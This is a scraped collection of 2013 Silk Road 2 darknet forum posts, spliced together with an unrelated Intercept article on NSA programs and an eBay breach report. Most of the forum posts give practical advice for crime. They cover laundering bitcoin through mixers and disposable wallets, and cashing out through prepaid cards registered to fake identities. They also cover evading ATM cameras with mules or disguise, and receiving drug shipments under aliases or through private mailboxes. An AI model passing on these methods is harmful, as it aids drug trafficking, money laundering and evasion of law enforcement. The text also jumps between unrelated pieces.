ID or even as little as a phone number which could be solved with a burner phone. Do not use online wallets as they are controlled by a third party and you have no real control over what information could be handed over or if that service will not run off with your coins, the most sure method of keeping your coins anonymous would be to transfer your Bitcoins from a Tor friendly exchange that let you make the purchase that you can create and dump once you are finished with making the single purchase. From the exchange send your Bitcoins to a disposable wallet you created with Electrum which can be installed in TAILS Linux, as soon as the network confirms the transaction you can delete the wallet.dat file and never use it again as the Bitcoins will be sent to a BitFog account you created just for this single transaction, setup a withdraw request with a delay of twenty-four hours and a minimum of six hours between each transaction that will send your Bitcoins to SilkRoad. You can have BitFog send coins to each of the five deposit address in your account and they should all turn up under your name, in the future if SilkRoad enables the single address per user system again make sure you create a new address each time.  For any left over Bitcoins you may have in the end setup an offline wallet.dat file or a paper wallet and store it somewhere secure.",""

The Online Interface gives you access to detailed History over your Card(s) and most likely the function to send money to other Accounts ( haven't investigated this Aspect so not familiar with how to use it ).  The most important reason/point of registering online is the fact you get to change your PIN Code, and secondarily I personally use it to see whenever the money has arrived at one card ( if I move funds over to say four cards with the same Account I only need to confirm it's arrived at one most of the time ).  To transfer funds to your Card, simply take your IBAN and add the characters ""PL"" before, ie. PL##########################. For SWIFT (BIC code) use: WBKPPLPP  D) Frequently Asked Questions  D-01) Is it possible to register more than one card Per Person and what are the Terms set by the Bank on this matter? D-02) Are there any known cases of these cards being shutdown and if so, why? D-03) When withdrawing Money from the Cards one can see by logging in very specifically what ATM has been used down to a very narrow geographic location - does it have any relevance if one uses the exact same ATM for multiple different Cards? Ie. is there any risk Bank Zachodni WBK would flag Cards as suspicious if they see different people start withdrawing money from the exact same ATM in a very short time span? D-04) Is there any Information if this Type of Service might eventually Expire in the Future or is nothing known about this? D-05) Is there any way for a Bitcoin Exchange to verify the details used for Registering the Account? Ie. can they cross-reference the Name used on an Exchange with the one used for a specific IBAN? D-06) Is there any Information regarding their Policy of Freezing Accounts? I've seen it mentioned they can Freeze the Account for three months if one attempts to withdraw twice near midnight, anything other than this?  D-01) Is it possible to register more than one card Per Person and what are the Terms set by the Bank on this matter?  TMan99: You always register it in a fake name, thats how they are anonymous... I don't see what you are asking. BioCanna: Its possible but if one card get flagged for suspicious behaviour all cards might get frozen. DrugsAndCash:  First of all you don't have to register this cards but yes of course for 1 identity you can register 10 cards maximum. But registration is useless and just wasting time. everythingman: yes you can but what ? its anonimity card so you register it on fake data  D-02) Are there any known cases of these cards being shutdown and if so, why?  BioCanna: No, i havent encountered a blocked card(besides 3months block caused by double withdrawing around midnight). DrugsAndCash: Yes I'm victim of case you described. Card has been blocked due to many small transactions from different people as loadings so bank flagged it as card used to receive business payments what is strictly prohibited. everythingman: yes if you exceed a limit and if the bank have a suspicion to money laundering ( but its unlikely if you dont register few cards on the same name   )  D-03) When withdrawing Money from the Cards one can see by logging in very specifically what ATM has been used down to a very narrow geographic location - does it have any relevance if one uses the exact same ATM for multiple different Cards? Ie. is there any risk Bank Zachodni WBK would flag Cards as suspicious if they see different people start withdrawing money from the exact same ATM in a very short time span?  BioCanna: Theres always risk but for now no one seems to check that matter and it works well . DrugsAndCash: This can't be the reason for flagging or blocking card. Flagging or blocking card is caused only by discovering by bank that card is funded from illegal money like funds from paypal scams or stolen from another bank account. everythingman: low risk because you can withdraw about 150 -200 cash daily and the most step in this is never show you face on ATM camera. This card is to withdraw cash in short time - its to holiday expenses  D-04) Is there any Information if this Type of Service might eventually Expire in the Future or is nothing known about this?  BioCanna: Poland is bound to USA and its possible that one day strict policies like in USA will come here to Poland and those cards wont be so easy to aquire anonymously. DrugsAndCash: It won't expire till goverment won't change law so I think it will always exist. everythingman: i haven't any information but i monitoring situation    D-05) Is there any way for a Bitcoin Exchange to verify the details used for Registering the Account? Ie. can they cross-reference the Name used on an Exchange with the one used for a specific IBAN?  BioCanna: Withdraw from bitcoin exchange will only go through if all data matches (banks and exchanges:name address...). DrugsAndCash: I can help you in this point by giving you exchanger which doesn't require verification. everythingman: No they not verify you should find exchange which don't interesting IBAN they clientc like btc-e , bitcurex itp  D-06) Is there any Information regarding their Policy of Freezing Accounts? I've seen it mentioned they can Freeze the Account for three months if one attempts to withdraw twice near midnight, anything other than this?  BioCanna: No, nothing that i know of. DrugsAndCash: Instant withdrawals after midnight can be the reason of freezing card so we don't recommend it but you can decrease this risk by doing some payments in stores using card. everythingman: yes if you withdraw on 23;55 you can cash out next on 00;02 cus its new day and its suspicion for him. i think that its only my word  E) Potential Scams  Almost every Single Vendor who's ever Offered or will ever Offer these Cards get Accusations of that the Information from the Cards have been Stolen and used to withdraw Funds from them. I've personally went through all Information I've been able to find on this Subject and there is unfortunately no Conclusive Information or Evidence. However if anyone has Trouble with this in the Future post here and answer the following Questions:  * Can you remember if the Letter looked tampered with? * What type of Card was it, ie. USD, EUR, or GPB? * Was the Card registered Online ( ie. did you change the PIN ) ? * What did the Information say online about where the Money went ( they have VERY specific Information available if it's through ATM ) ? * At what exact time/date did the Money disappear, when was money Deposited into the Account?  F) Final Notes  While these Cards aren't exactly the Ideal Solution as long as they're not Banned they will always be a viable Fallback Method for any Vendor planning to Cash out Bitcoin into Fiat Money. There are other Polish Banks like for example iBRE but this thread will detail only those of Bank Zachodni WBK as they're vastly Cheaper and more popular in Comparison. Eventually this Method will very likely be Phased Out in favor of Better Alternatives, but until that Day this Information might prove Useful for Upcoming Vendors who aren't that familiar with Methods of Cashing Out.

"Silk Road 2 Forums","Oneiros Distribution","596","2013-11-11T08:24:59","Bank Zachodni WBK - Cashing out Bitcoin through Prepaid VISA Cards","Discussion/Legal"," Since the Cards are supposed to be used by people on Holidays and the like they're looking for Signs they're used in a Commercial Manner, in other words many Small Transactions during a Short Period of Time. Seeing as most Individuals using these Cards will Deposit Funds very rarely they will have a very Hard Time telling apart this from the intended Holiday Use. Another small Detail that might be worth mentioning is the Fact ATM Withdrawals are Recorded and Logged so they know exactly at what Time and Date the withdrawal was made, and almost all ATMs use Cameras to both Record and Take a Picture at the Time of Withdrawal, so its best to either use a Mule or Use a Heavy Disguise. Do not Attempt to Cover the Camera on the ATM as in most Countries that will automatically send a Signal to the equivalent of High Security Police to Investigate.   If you're talking about the American Feds your point is moot as to my understanding possession of these Cards is in that Case Illegal even if you don't use them Actively. Your point only Stands in a System where there's Maneuverability to get the Upper Hand against Law Enforcement through various means - that is unfortunately almost Impossible here so all Cards on the Table here is a better approach according to me.   You basically have two Alternatives unless you use your own Bank, either you sell Bitcoin in person on Sites like https://localbitcoins.com or you acquire Virtual Identities that don't exist from example PerfectScans: http://silkroad6ownowfk.onion/users/perfectscans/items - If you go the Virtual Identity Route make sure you understand how VPNs work, a recommended thread to read about that is VPN Services That Take Your Anonymity Seriously, 2013 Edition: http://silkroad5v7dywlc.onion/index.php?topic=600  Even if you find an Exchange which has full Anonymity they're going to take a significantly higher Commission and will very likely Disappear at some Point at a later Date.   To my understanding Registration is not Required and they will work Regardless of the Fact, however some People have reported their Funds stolen ( unfortunately without Detailing exactly how ) and when you Register Online you have the possibility of Changing your PIN Code which might possibly help Guard against those kind of Attacks.  On a Final Note I have not yet seen any of the Vendors from the old Silk Road Re-List these Cards so far. In the Event no one steps up to the Plate and starts selling them I might consider Acquiring and selling them myself as I find them to be a good Alternative for Low-Level Vendors just starting out.

I believe it was BTC - 24 mainly, before they got closed and then if i remember correctly was bitstamp. However bitstamp has to verify your account so you will have to find another exchange where you dont need to verify. I think BTC- E is anonymous, but never used it. Just make up a fake polish name and polish address, this was never checked, as long as you put the correct iban number and what not on it should be fine. but i saved the fake polish details incase i tried to top up the card and it failed because i put in a different fake polish address the second time. I believe i used a website that randomly created the polish details for you. Took a few days to arrive on card. I think they have a 2500 limit. For some reason i couldnt withdraw on all the a.t.m's. You just have to go around till you find one that works. Also bought on amazon with it and used in store. But mainly just for withdrawing.  I highly recommend them. Or you could just use local bitcoins and sell your btc for cash in person. Maybe easier.   CaptainWhiteBeard","Hey Captain,If you can say, which exchange do you use?UKd"

But until then, I would like to get some feedback from the community about the legal notions regarding both Fake names and Real names while having packages shipped out.  Most of the time, since the inception of Silk Road 1, I have always used a Fake Name, and my argument was that, if anybody was watching me pick up the package and I have not opened it, then I could say, ""I have no Idea what this it, this isn't even in my name"". and play dumb like that.  But recently, the last package that was shipped out was marked ""Undeliverable As Addressed"". And my package got sent back, I think they re-routed it to another state.  So, my point is, buying dope on the internet is all fine and dandy, but if you are not getting your packages, then what is the point, right?  So, if I start using my real name, would Law Enforcement still have to provide the same burden of proof, and prove that I have knowledge of what is inside the package. They have to prove, without a reasonable doubt, that I am aware that there is dope in the package?  So, my question is.......Is it just as safe, Legally Speaking, to use a Fake Name / Alias to receive packages on the Silk Road and other Darknet Marketplaces as it is to just use your real name?  The only reason why I am even considering using my real name when sending my address through PGP-encrypted messages is because, like I said, these last two shipments, have been marked as ""Undeliverable As"", and I do not want to lose any more money.  So, would the same legal prerequisite still apply whether or not I use my Real Name of a Fake Alias Name.  How I would normally do it, I would go on the SSA.gov website and look at the most common First Names in the USA, then I would do the same for the most Common Last Names, and I would have fun playing mix and match between different packages.  Of course I would never be so dumb as to use John Smith.  But I would love to hear some input on this issue, and it is an issue.",""

Any delivery issues and loss of money/product from using a fake name is all on you.And you are putting unnecessary risk to the vendor when using a fake name.

At the end of the day you can't be arrested for receiving drugs in the mail I would use my own name, a big part of stealth is based on simplicity, if you're worried about being detected request a dealer to send you a personal letter with traces of drugs, you can not be arrested for traces of cocaine, methamphetamine or heroin, if that were the case you could be arrested for carrying cash in your wallet If you are considering dealing from Silk Road then leave your mail unopened until needed like somebody else suggested, but you don't want to do this, you ask any dealer real life customers are a pain and so are the police, whether they arrest you or not",""

But I have had multiple people throughou the years live with me or use my address for their home adddress, I don't think most mail carriers would not deliver a package just becasue it had a different name. On another note, I have a friend who is a mail carrier, a package was ""returned to sender"" becasue of a wrong address/name (whatever it was), the old lady who it got ""returned"" to said it was not hers, the postal inpector then has the authority to open the package to try to find the ""rightful owner"" by using information on the contents. Needless to say that postal inspector has a half key of coke now."

I remember one time I signed up for a free gimmick some company was giving away and without thinking I threw down some fake details not wanting the company to have my details on their database.

There is a fantastic thread somewhere on this forum on this whole subject of receiving packages, your rights, what to do, etc...  There is also a pretty interesting reddit AMA with a postal worker that covers all this as well.  Sorry I don't have the time right now to dig up the links but dig a little and you will find them.  My best suggestion has always ben to buy a UPS Store mailbox, NOT USPS.  UPS Store signs for all packages so if you get something sent to YOU in your REAL name and it is signed for, there is no way to prove you yourself accepted it since you never personally signed for it.  Also, most will deliver to the box whether there is a name on it or not, as long as the box number is on there.  Although based on the USPS guy in the AMA, one of the biggest red flags is anonymous delivery (ie either no return address on the package or no name, fake or not).  UPS Store is your friend and most are open 24/7 if you don't even want to see anyone.  And you even get an email when a package arrives that doesn't fit in the box.  Very convenient.",""

"Silk Road 2 Forums","inanna","2689","2013-11-09T23:36:25","Are MoneyPaks ""Safe""?","Discussion/Security","If you mean with random customers then the answer is no. Scammers will get you to release coins then freeze your greendot card. LEO will buy coins from you and track where your card was shipped to and where you cash out. Under an assumed identity and only dealing with trusted people it can work but if they ever get busted and talk you are going to get profiled to ATM locations. This is outdated but goes into a little more detail then I feel like typing:   Reloadable debit cards are an insecure method of financial transfer for various reasons. First, there is far too much cross network contamination. Vendors need a box to get the card shipped to plus they need to call and activate the card. The reloadable card company will keep the vendors box and telephone information on record (use a throw away phone). Plus, the vendor absolutely needs to use a fake identity to get the card. The second reason reloadable debit cards are insecure is because the vendor and customer both need to make appearances in a store on CCTV, once for the vendor but every time payment is sent for the customer. Stores that sell Greendot keep the CCTV footage for months. Customs and vendors can not take adequate measures to disguise their identities during the process because there is direct human interaction.      Another disadvantage of reloadable debit cards is the fact that they are centralized and almost none of them are based in countries friendly to financial privacy. Cards are likely to be frozen, the providers are likely to work with law enforcement. One of the most serious risks of reloadable debit cards is the ease with with financial networks can be mapped out. Vendors tend to have many customers send funding to a single centralized card. This means that a single compromised customer can compromise the Greendot card of the vendor. Then they can look for other customers sending money to that card (intelligence not evidence) and find their geolocation from where funds are loaded plus CCTV footage. The only way to prevent this is for the seller to use multiple Greendot cards, one for each customer to be perfect. This is not very feasible. Also, if one of a vendors customers is a fed they are now in a perfect position to gather intelligence. They already know where the vendor ships from. They know where other customers sent money from. If a customer sends a vendor money from Alicetown and the vendor ships priority from Bobtown, the feds now have intelligence indicating that a drug shipment will soon be sent priority from Alicetown to Bobtown. This is a tremendous risk.",""

"Silk Road 2 Forums","merge","4177","2013-11-24T13:21:54","Is it possible to do this (fast computer shutdown)","Discussion/Security","The solution to this problem in the context of servers is called Chassis Intrusion Detection. It is a feature of some motherboards that allows for it to detect if the case is opened and then execute some code. You can have it so if the case is opened the system immediately shuts down into a memory wipe. Another technique that is often coupled with this is putting the memory in encapsulation material to make it difficult to remove and access. Encapsulated memory + Chassis Intrusion Detection is enough to prevent almost anybody from dumping keys from RAM. You can also use something like Tresor to put keys in the CPU registers instead of RAM. They would need some extremely specialized tools to recover encryption keys from the CPU after a power down, CPU registers are automatically zeroed on power up so even if they somehow froze the CPU and it retained the key in its registers they would wipe it as soon as they dumped it into their super specialized forensic laptop (if such a laptop exists even). There are possibly theoretical ways to get the key out of the register of a frozen CPU but it seems like it would be really hard. So chassis intrusion detection + keys held in CPU registers is going to make cold boot attacks and encryption key dumping impossible. Of course if they have access to a live system though they don't need to do any of this because they already have access while it is powered on. Tails does fast shutdown into a memory wipe which can protect from cold boot attacks as well, although only if you activate it in time. There are two different problems being discussed here and both have different contexts of their own. The first problem is being able to do a quick shut down, the second problem is protecting from cold boot attacks after a quick shut down. There are two or three possible contexts, either you are using a Laptop or a Desktop or you are talking about a server. Quick shut down is best solved with deadman switches but in the context of a server it is best solved with chassis intrusion detection switches. Cold boot is best protected from with chassis intrusion detection + encapsulated RAM or keys held in CPU registers instead of RAM, or in the case of desktop and laptop users you can tie a memory wipe function to be triggered immediately after the deadman switch activates.  These are the platinum standard solutions to these problems. ",""

And i'll tell you why.  It's because there's this thing called a cold boot attack.  Let's assume Ross was running SR off a laptop with a battery, a magnetic disk drive, and a firewire port.  A few things can happen.  LEO can bust ross and copy everything off his hard drive live through his firewire/usb/whatever port, nullifying any encryption he used. Let's assume Ross' computer had no battery and was also encrypted.  Let's assume the encryption is strong enough so the FBI can't reasonably bruteforce it.  Let's assume ross was in front of his computer when he got busted, and let's assume he yanked the cord immediately.  All LEO would have to do is throw in a flashbang, run to the computer with a can of computer duseter, freeze the RAM chip, and then they have a minute or so to recover everything in RAM.  Including parts, if not all of the encryption key.  The only way to do things is to have a LOCKED server box that would take a minute or so to break through, therefore nullifying a cold boot attack, as well as using specific security protocols that, for example TAILS has that write junk data to your ram once you pull out the USB stick to prevent things like this.   A good way to have run Silk Road would have been for Ross to have made two fake ID's with two bank accounts, Hosted the Database end of the server in the Republic of cyberbunker anonymously, Hosted a Tor relay with the hidden service for people to connect in a Datacenter, using a military spec computer w/encryption, and a second datacenter under his sencond fake ID.  As long as he keeps the payments coming through to the datancenter for co-location, I doubt they care their 2u rackspace is communicating with another rack across the country, and then both to a database hosted in Cyberbunker.  This would mean that Ross cannot be shut down, unless the FBI arrest him, discover both his fake identities, shut down both servers, do a cold boot attack on both, which would be next to impossible, and break into the cyberbunker, which is also impossible, considering it's a Datacenter hosted in a de-commisioned NATO nuclear bunker.   He'd never have a single problem. His only problem was that he lived in the USA. WHY THE FUCK WOULD YOU LIVE IN THE USA?

FACTS ABOUT PGP IF U KNOW HOW to use it...  1. Vendors CANNOT link to your sr profile, so basicly when u send us a msg pgp encrypted and don't include the public key it delays everything cause then we gotta msg u back saying hey sr hasn't implemented a way for vendors to look at buyers profiles.  2. When u make a pgp key if i'm wrong correct me( in terms of opsec i mean) but u dont have to use a different user name as ur SR username. When a vendor actually gets ur public key and for example ur user name is Weedfucker420, but ur pgp name is Buttsex75, and the vendor has a program that stores all the public keys and they have 100s of  public keys its frustrating as hell or damn near impossible to figure out which key i just imported because it doesn't match ur name  3. This doesn't really pertain to me as but to u, when u make a public key don't use ur real name or ur real email address( u don't even have to use an email address) just use ur sr name.  4. Final etiquette always use pgp for ur address and ur msgs, a couple extra mins of work is better then 1 yr  in jail or whatever the fuck kinda buisiness u are up to.  If u guys think of anymore let me know, Also if some one could link some really good guides on how to use it that would be great, i'm sure they are out there but it never hurts to have another thread man cause there is too many pgp lazy mofos out there man, all it is is type msg copy it , encrypt choose person , paste it in sr msg box. and then wait for reply when u get the reply back copy the reply choose decrypt, enter the fuckin password u choose to set up ur public key and everything. and then press ok and paste the text some where in notepad or whatever, and rinse and fucking repeat.  This has nothing to do with pgp but use different passwords on every fucking account u make different for sr,agora, fucking where ever u go, all ur clear net passwords, it may take a little time but ur mind will learn to remember it, in the mean time u can make a small note while it takes time to remember them, or get some password program that or some bull shit i dunno the point is to teach buyers not how use pgp there is plenty of good guides out there on the forums all it takes is a search or 2.

The documents, leaked by NSA whistleblower Edward Snowden, also indicate that the agency has used âunder coverâ operatives to gain access to sensitive data and systems in the global communications industry, and that these secret agents may have even dealt with American firms. The documents describe a range of clandestine field activities that are among the agencyâs âcore secretsâ when it comes to computer network attacks, details of which are apparently shared with only a small number of officials outside the NSA.  âItâs something that many people have been wondering about for a long time,â said Chris Soghoian, principal technologist for the American Civil Liberties Union, after reviewing the documents. âIâve had conversations with executives at tech companies about this precise thing. How do you know the NSA is not sending people into your data centers?â  Previous disclosures about the NSAâs corporate partnerships have focused largely on U.S. companies providing the agency with vast amounts of customer data, including phone records and email traffic. But documents published today by The Intercept suggest that even as the agency uses secret operatives to penetrate them, companies have also cooperated more broadly to undermine the physical infrastructure of the internet than has been previously confirmed.  In addition to so-called âclose accessâ operations, the NSAâs âcore secretsâ include the fact that the agency works with U.S. and foreign companies to weaken their encryption systems; the fact that the NSA spends âhundreds of millions of dollarsâ on technology to defeat commercial encryption; and the fact that the agency works with U.S. and foreign companies to penetrate computer networks, possibly without the knowledge of the host countries. Many of the NSAâs core secrets concern its relationships to domestic and foreign corporations.  Some of the documents in this article appear in a new documentary, CITIZENFOUR, which tells the story of the Snowden disclosures and is directed by Intercept co-founder Laura Poitras. The documents describe a panoply of programs classified with the rare designation of âExceptionally Compartmented Information,â or ECI, which are only disclosed to a âvery selectâ number of government officials. Sentry Eagle  The agencyâs core secrets are outlined in a 13-page âbrief sheetâ about Sentry Eagle, an umbrella term that the NSA used to encompass its most sensitive programs âto protect Americaâs cyberspace.â  âYou are being indoctrinated on Sentry Eagle,â the 2004 document begins, before going on to list the most highly classified aspects of its various programs. It warns that the details of the Sentry Eagle programs are to be shared with only a âlimited numberâ of people, and even then only with the approval of one of a handful of senior intelligence officials, including the NSA director.  âThe facts contained in this program constitute a combination of the greatest number of highly sensitive facts related to NSA/CSSâs overall cryptologic mission,â the briefing document states. âUnauthorized disclosureâ¦will cause exceptionally grave damage to U.S. national security. The loss of this information could critically compromise highly sensitive cryptologic U.S. and foreign relationships, multi-year past and future NSA investments, and the ability to exploit foreign adversary cyberspace while protecting U.S. cyberspace.â  The document does not provide any details on the identity or number of government officials who were supposed to know about these highly classified programs. Nor is it clear what sort of congressional or judicial oversight, if any, was applied to them. The NSA refused to comment beyond a statement saying, âIt should come as no surprise that NSA conducts targeted operations to counter increasingly agile adversaries.â The agency cited Presidential Policy Directive 28, which it claimed ârequires signals intelligence policies and practices to take into account the globalization of trade, investment and information flows, and the commitment to an open, interoperable, and secure global Internet.â The NSA, the statement concluded, âvalues these principles and honors them in the performance of its mission.â  Sentry Eagle includes six programs: Sentry Hawk (for activities involving computer network exploitation, or spying), Sentry Falcon (computer network defense), Sentry Osprey (cooperation with the CIA and other intelligence agencies), Sentry Raven (breaking encryption systems), Sentry Condor (computer network operations and attacks), and Sentry Owl (collaborations with private companies). Though marked as a draft from 2004, it refers to the various programs in language indicating that they were ongoing at the time, and later documents in the Snowden archive confirm that some of the activities were going on as recently as 2012. TAREX  One of the most interesting components of the âcore secretsâ involves an array of clandestine activities in the real world by NSA agents working with their colleagues at the CIA, FBI, and Pentagon. The NSA is generally thought of as a spying agency that conducts its espionage from afarâvia remote commands, cable taps, and malware implants that are overseen by analysts working at computer terminals. But the agency also participates in a variety of âhuman intelligenceâ programs that are grouped under the codename Sentry Osprey. According to the briefing documentâs description of Sentry Osprey, the NSA âemploys its own HUMINT assets (Target ExploitationâTAREX) to support SIGINT operations.â  According to a 2012 classification guide describing the program, TAREX âconducts worldwide clandestine Signals Intelligence (SIGINT) close-access operations and overt and clandestine Human Intelligence (HUMINT) operations.â The NSA directs and funds the operations and shares authority over them with the Armyâs Intelligence and Security Command. The guide states that TAREX personnel are âintegratedâ into operations conducted by the CIA, FBI, and Defense Intelligence Agency. It adds that TAREX operations include âoff net-enabling,â âsupply chain-enabling,â and âhardware implant-enabling.â  According to another NSA document, off-net operations are âcovert or clandestine field activities,â while supply-chain operations are âinterdiction activities that focus on modifying equipment in a targetâs supply chain.â  The NSAâs involvement in supply-chain interdiction was previously revealed in No Place to Hide, written by Intercept co-founder Glenn Greenwald. The book included a photograph of intercepted packages being opened by NSA agents, and an accompanying NSA document explained the packages were âredirected to a secret locationâ where the agents implanted surveillance beacons that secretly communicated with NSA computers. The document did not say how the packages were intercepted and did not suggest, as the new documents do, that interception and implants might be done by clandestine agents in the field.  The TAREX guide lists South Korea, Germany, and Beijing, China as sites where the NSA has deployed a âforward-based TAREX presence;â TAREX personnel also operate at domestic NSA centers in Hawaii, Texas, and Georgia. It also states that TAREX personnel are assigned to U.S. embassies and other âoverseas locations,â but does not specify where. The document does not say what the âforward-basedâ personnel are doing, or how extensive TAREX operations are. But China, South Korea, and Germany are all home to large telecommunications equipment manufacturers, and China is known to be a key target of U.S. intelligence activities.  Although TAREX has existed for decades, until now there has been little information in the public domain about its current scope. A 2010 book by a former Defense Intelligence Agency officer, Lt. Col. Anthony Shaffer, described TAREX operations in Afghanistan as consisting of âsmall-unit, up-close, intelligence-gathering operatives. Usually two-to-three man units.â âUnder Coverâ Agents  The most controversial revelation in Sentry Eagle might be a fleeting reference to the NSA infiltrating clandestine agents into âcommercial entities.â The briefing document states that among Sentry Eagleâs most closely guarded components are âfacts related to NSA personnel (under cover), operational meetings, specific operations, specific technology, specific locations and covert communications related to SIGINT enabling with specific commercial entities (A/B/C).â  It is not clear whether these âcommercial entitiesâ are American or foreign or both. Generally the placeholder â(A/B/C)â is used in the briefing document to refer to American companies, though on one occasion it refers to both American and foreign companies. Foreign companies are referred to with the placeholder â(M/N/O).â The NSA refused to provide any clarification to The Intercept.  The document makes no other reference to NSA agents working under cover. It is not clear whether they might be working as full-time employees at the âcommercial entities,â or whether they are visiting commercial facilities under false pretenses. The CIA is known to use agents masquerading as businessmen, and it has used shell companies in the U.S. to disguise its activities.  There is a long history of overt NSA involvement with American companies, especially telecommunications and technology firms. Such firms often have employees with security clearances who openly communicate with intelligence agencies as part of their duties, so that the government receives information from the companies that it is legally entitled to receive, and so that the companies can be alerted to classified cyber threats. Often, such employees have previously worked at the NSA, FBI, or the military.  But the briefing document suggests another category of employeesâones who are secretly working for the NSA without anyone else being aware. This kind of double game, in which the NSA works with and against its corporate partners, already characterizes some of the agencyâs work, in which information or concessions that it desires are surreptitiously acquired if corporations will not voluntarily comply. The reference to âunder coverâ agents jumped out at two security experts who reviewed the NSA documents for The Intercept.  âThat one bullet point, itâs really strange,â said Matthew Green, a cryptographer at Johns Hopkins University. âI donât know how to interpret it.â He added that the cryptography community in America would be surprised and upset if it were the case that âpeople are inside [an American] company covertly communicating with NSA and they are not known to the company or to their fellow employees.â  The ACLUâs Soghoian said technology executives are already deeply concerned about the prospect of clandestine agents on the payroll to gain access to highly sensitive data, including encryption keys, that could make the NSAâs work âa lot easier.â  âAs more and more communications become encrypted, the attraction for intelligence agencies of stealing an encryption key becomes irresistible,â he said. âItâs such a juicy target.â  Of course the NSA is just one intelligence agency that would stand to benefit from these operations. Chinaâs intelligence establishment is believed to be just as interested in penetrating American companies as the NSA is believed to be interested in penetrating Chinese firms.  âThe NSA is a risk [but] I worry a lot more about the Chinese,â said Matthew Prince, chief executive of CloudFlare, a server company. âThe insider threat is a huge challenge.â Prince thinks it is unlikely the NSA would place secret agents inside his or other American firms, due to political and legal issues. âI would be surprised if that were the case within any U.S. organization without at least a senior executive like the CEO knowing it was happening,â he said. But he assumes the NSA or CIA are doing precisely that in foreign companies. âI would be more surprised if they didnât,â he said. Corporate Partners  The briefing sheetâs description of Sentry Owl indicates the NSA has previously unknown relationships with foreign companies. According to the document, the agency âworks with specific foreign partners (X/Y/Z) and foreign commercial industry entitiesâ to make devices and products âexploitable for SIGINTââa reference to signals intelligence, which is the heart of the NSAâs effort to collect digital communications, such as emails, texts, photos, chats, and phone records. This language clarifies a vague reference to foreign companies that appears in the secret 2013 budget for the intelligence community, key parts of which were published last year from the Snowden archive.  The document does not name any foreign companies or products, and gives no indication of the number or scale of the agencyâs ties to them. Previous disclosures from the Snowden archive have exposed the agencyâs close relationships with foreign intelligence agencies, but there has been relatively little revealed about the agency gaining the help of foreign companies.  The description of Sentry Hawk, which involves attacks on computer networks, also indicates close ties with foreign as well as American companies. The document states that the NSA âworks with U.S. and foreign commercial entitiesâ¦in the conduct of CNE [Computer Network Exploitation].â Although previous stories from the Snowden archive revealed a wide range of NSA attacks on computer networks, it has been unclear whether those attacks were conducted with the help of âcommercial entitiesââespecially foreign ones. The document does not provide the names of any of these entities or the types of operations.  Green, the cryptography professor, said âitâs a big dealâ if the NSA is working with foreign companies on a greater scale than currently understood. Until now, he noted, disclosures about the agencyâs corporate relationships have focused on American companies. Those revelations have harmed their credibility, nudging customers to foreign alternatives that were thought to be untouched by the NSA. If foreign companies are also cooperating with the NSA and modifying their products, the options for purchasing truly secure telecommunications hardware are more limited than previously thought.  The briefing sheet does not say whether foreign governments are aware that the NSA may be working with their own companies. If they are not aware, says William Binney, a former NSA crypto-mathematician turned whistleblower, it would mean the NSA is cutting deals behind the backs of friendly and perhaps not-so-friendly governments.  âThe idea of having foreign corporations involved without any hint of any foreign government involved is significant,â he said. âIt will be an alert to all governments to go check with their companies. Bring them into parliament and put them under oath.â  The description of Sentry Raven, which focuses on encryption, provides additional confirmation that American companies have helped the NSA by secretly weakening encryption products to make them vulnerable to the agency. The briefing sheet states the NSA âworks with specific U.S. commercial entitiesâ¦to modify U.S manufactured encryption systems to make them exploitable for SIGINT.â It doesnât name the commercial entities or the encryption tools they modified, but it appears to encompass a type of activity that Reuters revealed last yearâthat the NSA paid $10 million to the security firm RSA to use a weak random number generator in one of its encryption programs.  The avalanche of NSA disclosures since the Snowden leaks began in 2013 has shattered whatever confidence technologists once had about their networks. When asked for comment on the latest documents, Prince, the CEO of CloudFlare, began his response by saying, âWeâre hyper-paranoid about everything.â",""

The breach compromised a database containing a list of encrypted passwords that, once released in the wild, could potentially be decrypted through publicly available tools. As a result, eBay is asking users to change passwords as soon as possible. Officials say no financial data was implicated, and the company hasn't found any evidence of unauthorized activity resulting from breach.The attack itself took place some time between late February and early March, when attackers obtained a group of employee log-in credentials, allowing access to the larger database. Even after the attack, eBay wasn't aware of the compromise until two weeks ago, and it took detailed forensic analysis to implicate the password database, resulting in today's announcement.In addition to passwords, the database contained basic login information like name, email, phone number, address and date of birth, but officials stressed that, aside from the passwords, no confidential or personal information was included in the breach. Paypal was not involved in the breach, as PayPal data is kept on a separate network with higher levels of encryption. Still, a site-wide password reset is generally seen as the best response to this kind of breach. eBay also reminded users to make the change at any other sites where they had used the same password, a bad security practice that is nonetheless widespread."

"Silk Road 2 Forums","kok","1348","2013-11-01T12:25:44","pleas stop misusing your PGP signature","Discussion/Security"," Roughly speaking, RSA signatures are public key encryption in reverse. When you sign a message, first a hash value of the message is taken. Then you encrypt that value with your private key. With RSA, anything encrypted with one half of a keypair can be decrypted with the other half. So when someone verifies your signature, first they take the hash value of the signed message. Then they decrypt the signature with your public key, and then they compare the plaintext with the hash they took of the message. If the two match the signature is validated. Since only you have your private key, only you can encrypt anything with it. Nobody else knows how to make a ciphertext that decrypts into the hash of a message you signed, because nobody else has your private key. Since you changed the message, the hash value of the message will be different. When I take the hash value of this message and compare it to the plaintext signature, which I can get by decrypting the signature with the public key of the person who posted it, they are not going to match up.

Urbantoker, how do you know it says your coins are still in escrow? How can you get on the site in order to check your wallet??  Are you quoting Defcon? Without referring back to his message, I can't remember.  I'm sorry, I'm confused.....  I don't know what I had in my wallet, to tell the truth. Maybe a few dollars change. I've been feelin' something like this coming for some time, especially since all that's been in the news lately about bitcoin malability and all the DOS attacks. So I asked my vendor if we could do business off-site (sorry SR mods, but it's true).  That was the day before the theft.  I sent my coins, but what I didn't know was that my vendor had me send them to a wallet that was affected by the attack and he/she never got my money. I feel horrible for my vendor, because I know that she/he will send my order somehow anyway.....we just have that sort of trust.  I feel like I should tell her/him to not send it because I feel horrible about this whole thing.  You never wanna say ""I told ya so""......   Sorry, got off on a tangent there....  ~Hippiechick ","Guys I cant understand if its just our coins in escrow or are wallet? it says the coins in the system are gone but it also says escrow?"

This is no exploit when you notice the time-tables of those withdrawals.       As I understand it, the malleable ""hash"" exploit has to happen before there's any confirmations so as to confuse the server into either putting the BTC's into the original wallet or the new ""hashed"" one created by the exploiter.      Sometimes it works, and other times it doesn't.  It's pure chance.  To see that ALL of the coins from the wallets were able to make it to their destination 100% of the time tells me...it's an inside job.       Of course...I'm really high right now and all of the above could be completely wrong.  I'm sure some thread nazi will arrive soon to let us know lol.",""

Android was handing out predictable numbers until recently, as app devs were using the java API to do this instead of directly calling /dev/random. I have no idea if they fixed Orbot I assume they did. You might want to look into it to see where they are sourcing entropy from.   Your telecom can also see you starting/stopping tor unless you also have a VPN, then they see nothing.

